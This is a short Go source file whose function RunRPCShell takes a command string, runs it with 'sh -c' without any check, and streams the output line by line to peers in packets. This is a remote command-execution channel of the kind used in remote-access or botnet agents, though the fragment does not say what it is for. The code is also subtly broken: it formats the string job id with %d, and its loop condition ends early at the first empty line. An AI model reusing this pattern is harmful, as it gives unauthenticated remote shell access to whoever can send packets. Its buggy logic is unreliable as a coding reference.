package main

import (
	"fmt"
	"os/exec"
	"strings"
)

func RunRPCShell(bashline string, jobid string) {
	out, err := exec.Command("sh", "-c", bashline).Output()
	Pack := PeerPacket{}
	Pack.Service = "RPC"
	if err != nil {
		Pack.Message = fmt.Sprintf("~%s!! Failed to run command - %s", jobid, err.Error())
		SendPacket(Pack)
		return
	}

	lines := strings.Split(string(out), "\n")
	for i := 0; i < len(lines); i++ {
		if lines[i] == "" || lines[i] == "\r" && i == len(lines)-1 {
			return
		}
		Pack.Message = fmt.Sprintf("~%d [%d/%d] - %s", jobid, i, len(lines)-1, lines[i])
		SendPacket(Pack)
	}
}
